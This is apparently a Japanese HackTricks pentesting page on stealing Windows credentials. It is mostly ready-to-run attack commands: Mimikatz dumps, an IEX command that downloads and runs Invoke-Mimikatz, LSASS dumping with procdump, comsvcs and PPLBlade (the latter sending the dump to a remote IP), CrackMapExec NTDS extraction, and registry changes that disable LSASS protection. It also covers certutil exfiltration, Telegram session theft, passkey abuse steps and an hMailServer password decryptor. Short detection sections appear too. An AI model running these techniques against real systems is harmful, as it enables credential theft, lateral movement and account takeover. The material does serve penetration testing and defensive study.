# Windows認証情報の窃取

{{#include ../../banners/hacktricks-training.md}}

## 認証情報 Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatzで実行できるその他の機能は** [**このページ**](credentials-mimikatz.md)**を参照してください。**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**認証情報の保護策についてはこちらをご覧ください。**](credentials-protections.md) **これらの保護策により、Mimikatzによる一部の認証情報の抽出を防げる可能性があります。**

## Meterpreterでの認証情報

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)**を使って**、被害者のシステム内の**パスワードとハッシュを検索**します。

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AVの回避

### Procdump + Mimikatz

**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)のProcdumpは正規のMicrosoftツールなので**、Defenderには検出されません。\
このツールを使って**lsass processをダンプし**、**ダンプをダウンロードして**、ダンプから**認証情報をローカルで抽出**できます。

[SharpDump](https://github.com/GhostPack/SharpDump)を使うこともできます。

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) を使って自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注**: 一部の **AV** は、**procdump.exe で lsass.exe を dump する操作**を**悪意のあるものとして検知**する場合があります。これは、文字列 **"procdump.exe" と "lsass.exe"** を**検知**しているためです。そのため、**lsass.exe の名前ではなく**、lsass.exe の **PID** を **引数**として procdump に**渡す**ほうが、より**ステルス性が高く**なります。

### **comsvcs.dll** で lsass を dump する

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ発生時に**プロセスメモリを dump する**役割を担っています。この DLL には **`MiniDumpW`** という**関数**が含まれており、`rundll32.exe` を使って呼び出すように設計されています。\
最初の2つの引数は無視してかまいませんが、3つ目の引数は3つの要素に分かれています。dump 対象のプロセス ID が1つ目の要素、dump ファイルの保存先が2つ目の要素、3つ目の要素は **full** という単語に限定されます。他のオプションはありません。\
これら3つの要素が解析されると、DLL は dump ファイルを作成し、指定されたプロセスのメモリをそのファイルに転送します。\
**comsvcs.dll** を使用して lsass プロセスを dump できるため、procdump をアップロードして実行する必要はありません。この方法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) を参照してください。<sup>[[9]](#references)</sup>

次のコマンドを実行します:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Managerを使ったlsassのDump**

1. Task Barを右クリックし、Task Managerをクリックします
2. 「詳細」をクリックします
3. 「プロセス」タブで「Local Security Authority Process」を探します
4. 「Local Security Authority Process」を右クリックし、「ダンプ ファイルの作成」をクリックします

### procdumpを使ったlsassのDump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートの一部である、Microsoft署名済みのバイナリです。

既存のシステム全体のクラッシュダンプや、アクセス可能なユーザーフォルダーにある圧縮コピーには、オフライン分析用の認証情報が残っている場合があります。`MEMORY.DMP`や`MEMORY.7z`などのファイル名は、確認の手掛かりにすぎません。出所とアクセス権を確認し、使用可能または最新の認証情報が含まれていると決めつけないでください。

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBladeを使ったlsassのダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)は、メモリダンプを難読化し、ディスクに保存せずにリモートワークステーションへ転送できるProtected Process Dumper Toolです。

**主な機能**:

1. PPL保護の回避
2. Defenderのシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
3. RAWおよびSMBのアップロード方式を使った、ディスクに保存しないメモリダンプのアップロード（ファイルレスダンプ）

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDumpを使わないSSPベースのLSASSダンプ

Ink Dragonは、`MiniDumpWriteDump`を一切呼び出さない3段階のdumper、**LalsDumper**を使用しています。そのため、このAPIに対するEDR hookは発動しません:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`内で小文字の`d`が32個並んだプレースホルダーを検索し、それを`rtu.txt`の絶対パスで上書きします。パッチ済みDLLを`nfdp.dll`として保存し、`AddSecurityPackageA("nfdp","fdp")`を呼び出します。これにより、**LSASS**は悪意のあるDLLを新しいSecurity Support Provider (SSP)としてロードします。
2. **LSASS内のStage 2** – LSASSが`nfdp.dll`をロードすると、DLLは`rtu.txt`を読み込み、各バイトを`0x20`でXORし、デコードしたblobをメモリにマッピングしてから実行を移します。
3. **Stage 3 dumper** – マッピングされたpayloadは、ハッシュ化されたAPI名から解決した**direct syscalls**を使ってMiniDumpのロジックを再実装します（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。専用のexportである`Tom`は`%TEMP%\<pid>.ddt`を開き、圧縮されたLSASS dumpをファイルに書き込み、handleを閉じます。これにより、後からexfiltrationできます。

Operator向けメモ:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt`は同じディレクトリに置きます。Stage 1はハードコードされたプレースホルダーを`rtu.txt`の絶対パスで書き換えるため、ファイルを分けるとchainが壊れます。
* 登録は`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`に`nfdp`を追加して行われます。この値を自分で登録すると、起動のたびにLSASSがSSPを再ロードするようにできます。
* `%TEMP%\*.ddt`ファイルは圧縮されたdumpです。ローカルで展開してから、Mimikatz/Volatilityに渡してcredentialを抽出します。
* `AddSecurityPackageA`を成功させるには、`lals.exe`の実行にadmin/SeTcb権限が必要です。呼び出しが戻ると、LSASSは不正なSSPを透過的にロードしてStage 2を実行します。
* DLLをディスクから削除しても、LSASSからは削除されません。レジストリエントリを削除してLSASSを再起動（reboot）するか、長期的なpersistenceのためにそのまま残します。

## CrackMapExec

### SAM hashをダンプする

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA secrets のダンプ

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### ターゲット DC から NTDS.dit を Dump する

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### target DCからNTDS.ditのパスワード履歴をダンプする

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM と SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM_ に**あります**。ただし、保護されているため、**通常の方法ではコピーできません**。

### レジストリから

これらのファイルを窃取する最も簡単な方法は、レジストリからコピーを取得することです。

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**これらのファイルをダウンロード**してKaliマシンに保存し、以下を使用して**ハッシュを抽出**します:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

このサービスを使って、保護されたファイルをコピーできます。Administrator 権限が必要です。

#### vssadmin の使用

vssadmin バイナリは Windows Server バージョンでのみ利用できます。

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

ただし、**Powershell**から同じことができます。これは**SAMファイルをコピーする方法**の例です（使用するハードドライブは「C:」で、C:\users\Publicに保存します）。ただし、保護されたファイルならどれでもコピーできます。

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

本のコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使って、SAM、SYSTEM、ntds.ditのコピーを作成することもできます。

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory の認証情報 - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の中核として知られており、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースで、**_%SystemRoom%/NTDS/ntds.dit_** にあります。

このデータベースには、次の3つの主要なテーブルがあります。

- **Data Table**: このテーブルには、ユーザーやグループなどのオブジェクトに関する詳細情報が保存されます。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **security descriptors** が保存され、格納されたオブジェクトのセキュリティとアクセス制御を確保します。

Christoffer Andersson によるデータベース層の調査では、これらのテーブルとバージョンごとの動作について、さらに詳しく解説されています。<sup>[[8]](#references)</sup>

Windows は _Ntdsa.dll_ を使用してこのファイルとやり取りし、これは _lsass.exe_ によって使用されます。そのため、**NTDS.dit** ファイルの**一部**は **`lsass`** のメモリ内に存在する可能性があります（パフォーマンス向上のために **cache** が使用され、直近にアクセスされたデータが含まれていると考えられます）。

#### NTDS.dit 内のハッシュを復号する

ハッシュは3回暗号化されています。

1. **BOOTKEY** と **RC4** を使用して、Password Encryption Key (**PEK**) を復号します。
2. **PEK** と **RC4** を使用して、**hash** を復号します。
3. **DES** を使用して、**hash** を復号します。

**PEK** はすべてのドメイン コントローラーで**同じ値**ですが、そのドメイン コントローラー固有の **SYSTEM** ハイブにある **BOOTKEY** を使用して、**NTDS.dit** 内で**暗号化**されています。そのため、認証情報を抽出するには **NTDS.dit** と **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) の両方が必要です。

### Ntdsutil を使用して NTDS.dit をコピーする

Windows Server 2008 以降で利用できます。

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

**NTDS.dit** ファイルをコピーするには、[**volume shadow copy**](#stealing-sam-and-system) の方法も使えます。また、**SYSTEM ファイル**のコピーも必要になることを忘れないでください（こちらも、[**レジストリからダンプするか、volume shadow copy を使う**](#stealing-sam-and-system) 方法があります）。

### **NTDS.dit からハッシュを抽出する**

**NTDS.dit** ファイルと **SYSTEM** ファイルを**取得した**ら、_secretsdump.py_ などのツールを使って**ハッシュを抽出**できます：

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

有効な domain admin ユーザーを使用して、**自動的に抽出する**こともできます。

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**大きな NTDS.dit ファイル**は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使って抽出することをおすすめします。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` も使用できます。

### **NTDS.dit からドメインオブジェクトを SQLite データベースに抽出する**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使うと、NTDS オブジェクトを SQLite データベースに抽出できます。秘密情報だけでなく、オブジェクト全体とその属性も抽出されるため、NTDS.dit ファイルをすでに取得している場合は、さらに情報を抽出できます。

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hiveは任意ですが、secretsの復号に使用できます（NT & LM hashes、cleartext passwordsなどの補足資格情報、Kerberosまたはtrust keys、NT & LM password histories）。ほかの情報とあわせて、以下のデータが抽出されます：ユーザーおよびマシンのアカウントとそのhashes、UAC flags、最終ログオンおよびパスワード変更のtimestamp、アカウントの説明、名前、UPN、SPN、groupsと再帰的なmembership、organizational unitsのツリーとmembership、trustのtype、direction、attributesを含むtrusted domains...

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)からbinaryをダウンロードしてください。このbinaryを使って、複数のソフトウェアからcredentialsを抽出できます。

```
lazagne.exe all
```

## SAM と LSASS から認証情報を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールを使用して、メモリから認証情報を抽出できます。こちらからダウンロードしてください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAMファイルから認証情報を抽出する

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM ファイルから認証情報を抽出する

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

ここからダウンロードし:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)、**実行するだけ**でパスワードが抽出されます。

## アイドル状態のRDPセッションの調査とセキュリティ制御の弱体化

Ink DragonのFinalDraft RATには、あらゆるred-teamerに役立つ手法を使う`DumpRDPHistory`タスカーが含まれています:<sup>[[3]](#references)</sup>

### DumpRDPHistory形式のテレメトリ収集

* **外向きRDPの接続先** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`にあるすべてのユーザーハイブを解析します。各サブキーには、サーバー名、`UsernameHint`、最終書き込み時刻が保存されています。PowerShellを使ってFinalDraftのロジックを再現できます:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Inbound RDP の証拠** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログでイベント ID **21**（ログオン成功）と **25**（切断）を検索し、誰がそのマシンを管理していたかを特定します。

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

接続を定期的に行う Domain Admin が判明したら、その**切断済み**セッションがまだ存在している間に、LalsDumper/Mimikatz で LSASS を dump します。CredSSP と NTLM fallback により、認証情報の verifier と token が LSASS に残るため、それらを SMB/WinRM 経由で replay して `NTDS.dit` を取得したり、ドメインコントローラーに persistence を仕掛けたりできます。

### FinalDraft が標的とするレジストリのダウングレード

同じ implant は、credential theft を容易にするため、複数のレジストリキーも改変します:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` を設定すると、RDP 中に認証情報／チケットが全面的に再利用され、pass-the-hash 型のピボットが可能になります。
* `LocalAccountTokenFilterPolicy=1` は UAC のトークンフィルタリングを無効にするため、ローカル管理者はネットワーク経由で制限のないトークンを取得します。
* `DSRMAdminLogonBehavior=2` にすると、DC の稼働中に DSRM administrator がログオンできるため、攻撃者が利用できる高権限の組み込みアカウントがもう1つ増えます。
* `RunAsPPL=0` は LSASS の PPL 保護を解除するため、LalsDumper などのダンパーによるメモリアクセスが容易になります。

## hMailServer の設定認証情報（侵害後）

インストール構成に応じて、正確な設定ファイル `C:\Program Files\hMailServer\Bin\hMailServer.ini`、`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`、`C:\ProgramData\hMailServer\hMailServer.ini` を確認します。読み取り可能で空でない `[Security] AdministratorPassword=` の値は hMailServer の管理者パスワードハッシュであり、Windows Administrator のパスワードを示すものではありません。この認証情報を復元できた場合でも、Windows アカウントへのピボットには、パスワードの再利用とログオン権限の個別の確認が必要です。

SQL CE データベースを使用するインストールでは、INI 内の別の `[Database] Password=` の値がデータベースを保護します。旧式のインストールでは、この値は静的キー `THIS_KEY_IS_NOT_SECRET` を使い、4バイト単位でエンディアンを入れ替えて Blowfish 暗号化されています。INI の16進文字列を使い、次の Python スニペットを実行します。<sup>[[2]](#references)</sup>

まず、現在のアカウントで INI と対応する SQL CE の `.sdf` データベースの**両方**を読み取れることを確認します。INI のパスワードはデータベースを保護するもので、その中に保存されたメールボックスアカウントのハッシュとは別物です。使用中のデータベースは、必ず**コピー**を調査またはアップグレードし、稼働中のファイルには手を加えないでください。

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

平文パスワードを使ってファイルロックを回避するためにSQL CEデータベースをコピーし、32-bit providerを読み込んで、必要に応じてアップグレードしてからハッシュを照会します。

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` 列では hMailServer の hash format（hashcat mode `1421`）が使われています。解読したメールボックスのパスワードが Windows user pivot に使えるのは、そのパスワードがローカルまたはドメインアカウントでも再利用されており、そのアカウントに必要な remote-logon 権限がある場合に限られます。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部のツールは、LSA logon callback `LsaApLogonUserEx2` を intercept して **plaintext logon passwords** を取得します。認証パッケージの callback を hook または wrap し、認証前に **logon 中** の credentials を取得してから、ディスクに書き込むか operator に返す仕組みです。一般に、LSA に inject または登録する helper として実装され、成功した interactive/network logon event ごとに username、domain、password を記録します。<sup>[[1]](#references)</sup>

運用上の注意:
- 認証経路に helper を読み込むには、ローカル管理者または SYSTEM 権限が必要です。
- 取得した credentials が現れるのは logon が発生した場合のみです（hook によって、interactive、RDP、service、network logon が対象になります）。

## SSMS の保存済み接続 credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、ユーザーごとの `sqlstudio.bin` ファイルに保存済みの接続情報を格納します。専用 dumper を使うと、ファイルを解析して保存済みの SQL credentials を復元できます。コマンド出力しか返さない shell では、ファイルを Base64 に encode して stdout に出力し、exfiltrate する方法がよく使われます。<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

オペレーター側でファイルを再ビルドし、ローカルで dumper を実行して認証情報を復元します:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocol を介したブラウザーセッションと cookie の窃取

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop の `tdata` セッション窃取

Telegram Desktop は、認証情報とアカウントの状態を **`tdata`** ディレクトリに保持します。コピーしたセッションは、互換性のあるツールで読み込むことで、認証が有効な間はアカウントのパスワードなしで認証できます。ローカルデータの暗号化が有効な場合、stealer にはパスコードも必要です。認証済みセッションからは、ID情報、ダイアログやメンバーシップのメタデータ、メッセージ、ダウンロード可能なメディアにアクセスできます。<sup>[[10]](#references)</sup>

### 検出と取得

インストール版とポータブル版の両方の配置場所を検索します。Microsoft Store のパッケージ名は異なるため、`TelegramMessenge` を含むパッケージディレクトリを列挙し、その `LocalCache\Roaming` サブツリーを調べます。<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

通常の読み取りに失敗し、プロセストークンに `SeBackupPrivilege` が**すでに含まれ、有効化されている**場合は、backup-aware access が代替手段になります。ただし、特権を取得したり、プロセスを昇格させたりするものではありません。必要なトークン特権がある場合、`FILE_FLAG_BACKUP_SEMANTICS` を指定した `CreateFileW` は backup/restore セマンティクスを要求し、ファイルのセキュリティチェックを回避できます。ただし、このフラグだけでは、互換性のない共有ロックを回避できません。<sup>[[10]](#references)[[11]](#references)</sup>

使用中でロックされたファイルには **Volume Shadow Copy** を作成して読み取り、ACL によってブロックされたファイルには `robocopy /B` を使います。backup mode により、ファイルとディレクトリの ACL を回避できます。<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

帯域幅を意識した implant は、最初にファイルパスの一覧だけを送信し、C2 にすでに保存されているパスと snapshot identifier を受け取って、不足しているファイルだけをアップロードする場合があります。そのため、再帰的な `tdata` の列挙後に少量の差分転送しか行われていなくても、セッション窃取が成功している可能性があります。<sup>[[10]](#references)</sup>

### 検知と封じ込め

Telegram 以外のプロセスによる `tdata` への再帰アクセスを、`SeBackupPrivilege` の有効化、backup-semantics を使用したファイルオープン、VSS のアクティビティ、または `/B` を使用する子プロセス `robocopy.exe` と関連付けて調査してください。また、`%APPDATA%` と `%LOCALAPPDATA%\Packages` の両方が短時間に列挙された後、同じプロセスから外部接続が発生していないかも調査してください。侵害後は、**設定 → デバイス**（または **プライバシーとセキュリティ → アクティブなセッション**）から、見覚えのないセッションを終了してください。2 段階認証を有効にするだけでは、すでに盗まれた認証を無効化できません。<sup>[[10]](#references)[[13]](#references)</sup>

## Windows 上の Chrome からの Passkeys / WebAuthn 認証情報の窃取

**Google Password Manager と同期された passkeys を使用している Chrome** の Windows ホストで、**被害者ユーザー**としてコード実行を獲得できた場合、**admin/SYSTEM 権限がなくても** passkeys は興味深い post-exploitation の標的となります。<sup>[[4]](#references)</sup>

### 注目すべきローカルアーティファクト

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** には、protobuf でエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されます。同一ユーザーのプロセスは、同期された passkey の **RP ID**、**username**、**credential ID**、暗号化された秘密鍵のデータを列挙できます。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** や、同期された認証情報の復元に使われるラップ済みシークレットなど、ローカルのデバイス登録状態が保存されます。<sup>[[4]](#references)</sup>

簡易トリアージ:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM に紐づいた鍵 blob も、ローカルの signing oracle として悪用できる

ブラウザーが TPM-backed identity key を **`NCRYPT_OPAQUE_KEY_BLOB`** としてエクスポートし、その blob をユーザーがアクセス可能な状態に保存している場合、マルウェアは raw private key を抽出する必要はありません。同じマシン上で blob を再インポートし、攻撃者が制御するデータへの署名をローカルの TPM に要求するだけで済みます:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

これは、**hardware binding によってデバイス外へのエクスポートは防止できるものの、侵害されたエンドポイント上で同一ユーザーとして使用することは防げない**ことを意味します。

### 実際に悪用される経路

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome の LevelDB から `WebauthnCredentialSpecifics` を列挙する。
   - passkey login を開始し、新しい WebAuthn challenge を取得する。
   - 盗んだ `wrapped_identity_private_key` blob を被害者の TPM 上で使用し、cloud-authenticator request binding に署名する。
   - 返された assertion を relying party に中継する。
   - RP が `userVerification=preferred` を受け入れる場合や、**`UV=0`** の assertion を拒否しない場合に、特に有効です。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state` を削除するか、有効な署名付き `device/forget` 操作を送信して、再オンボーディングを強制する。
   - オンボーディング後にデバイスが **`uv_key_pending`** の状態になる場合、攻撃者が管理する UV public key を登録する。
   - provider が新しい UV key の attestation / secure-hardware origin を検証しない場合、その後に攻撃者の key から行われた署名は **`UV=1`** として扱われます。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - Chrome が同期済み passkey の master secret を取得するよう、recovery または再参加を強制する。
   - `passkey_enclave_state` の再作成や変更を監視し、平文の **security domain secret (SDS)** が存在する間に Chrome のメモリをダンプする。
   - 復元した SDS を使って、すべての `WebauthnCredentialSpecifics` record 内の暗号化フィールドを復号し、持ち出し可能な WebAuthn private key を復元する。

### DFIR / 検知のアイデア

- `passkey_enclave_state` の**削除・再作成**を監視する。<sup>[[4]](#references)</sup>
- ブラウザー以外のプロセスによる Chrome の **`Sync Data\LevelDB`** への異常なアクセスを警告する。
- **Chrome のメモリダンプ**や、プロセス間メモリアクセスの不審な動作を警告する。
- **Google Password Manager recovery PIN** の繰り返しのプロンプト表示や、予期しない再オンボーディングを調査する。
- WebAuthn の **`signCount`** は、同期済み passkey では一定のままの場合が多く、役に立たないことがあります。そのため、従来型の clone 検知は効果が弱い点に留意してください。

## References

- [1] [Unit 42 – 高価値セクターを標的とした、長年にわたり検知されなかった作戦の調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro による SMTP 経由のフィッシング → hMailServer の認証情報を復号 → Veeam CVE-2023-27532 で SYSTEM 権限を取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
